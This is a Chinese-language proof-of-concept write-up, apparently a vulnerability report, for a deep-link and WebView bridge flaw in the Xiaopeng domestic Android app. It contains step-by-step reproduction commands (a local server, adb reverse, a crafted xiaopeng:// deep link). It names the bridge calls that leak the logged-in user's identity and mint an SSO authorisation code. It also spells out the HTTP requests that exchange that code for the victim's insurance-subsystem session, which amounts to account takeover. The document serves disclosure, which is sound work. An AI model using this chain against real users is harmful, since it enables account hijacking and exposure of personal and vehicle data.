# 小鹏国内版 DeepLink WebView 越权 PoC（2026-09）

## 漏洞链
`xiaopeng://www.xiaopeng.com/common/webview?url=<任意URL>` → GateActivity(exported) → WebViewActivity 无域名校验加载
+ 桥白名单把 `localhost` 当全方法放行 → `_dsbridge` 全部原生方法可用（getLoginState/getAuthCode/request/pay…）
+ `__xp_info__` 自动注入任意域名页面（uid/昵称/头像/登录态，零调用）

## 演示页
| 页面 | 用途 | 效果 |
|---|---|---|
| `launch-cn.html` | 唤起载体（浏览器打开，3s倒计时唤起App） | - |
| `x.xiaopeng.com/index.html` | github.io 攻击域页 | ① `__xp_info__` 身份泄露（加载闸绕过演示）；桥在本域 -2 拒绝（桥闸按host） |
| `localhost-poc.html` | 本机版（`adb reverse tcp:18765 tcp:18765` 后按下方步骤） | **全方法**：身份/授权码/API代发 |

## localhost 全链复现（审核步骤）
```bash
# 1. 本机起服务（任意静态服务器，本仓库 localhost-poc.html 放根目录）
python3 -m http.server 18765 --bind 127.0.0.1
# 2. USB 连接已登录小鹏国内版App的手机
adb reverse tcp:18765 tcp:18765
# 3. 唤起（或浏览器打开 launch-cn.html 的本地变体）
adb shell am start -a android.intent.action.VIEW \
  -d 'xiaopeng://www.xiaopeng.com/common/webview?url=http%3A%2F%2Flocalhost%3A18765%2Flocalhost-poc.html'
# 4. 页面自动依次执行并显示:
#    getLoginState  → uid/掩码手机/昵称/头像
#    getAuthCode    → {"code":1,"data":{"code":"<授权码>"}}     ← SSO授权码
#    request        → 以受害者全套凭证(mTLS+TEE+XP签名)代发任意API
```

## 授权码(code)兑换受害者会话（账户接管闭环）
```
桥铸 code(target=xp_digitalservice_insurance, 30秒内有效)
→ POST service.xiaopeng.com/api/insurance/public/insurance/case/getVehicleInfo
   body {"frameNumber":"<假VIN>","frontRedirect":"https://service.xiaopeng.com/insurance/home?ch=CAR_INFO"}
   响应 data.callbackUrl（含state）
→ GET {callbackUrl}&code=<桥铸的code>
→ ★ Set-Cookie: wasxid-xp_digitalservice_insurance / wasxuid=<受害者uid>（7天会话）
→ 攻击者以受害者身份操作该子系统（查任意车牌/保险信息等）
```
注：code 换的是目标子系统 web 会话（OAuth 模型），非 App JWT。

## 与国际版报告的关系
国际版 xpsrc20260815235901323998018（高危）缺陷1+缺陷2 在国内版 v5.19.0 同样存在；
国内版桥白名单改按 host 匹配（路径段绕过仅过加载闸），但 localhost 全放行仍在 + `__xp_info__` 无差别注入为新泄露面。
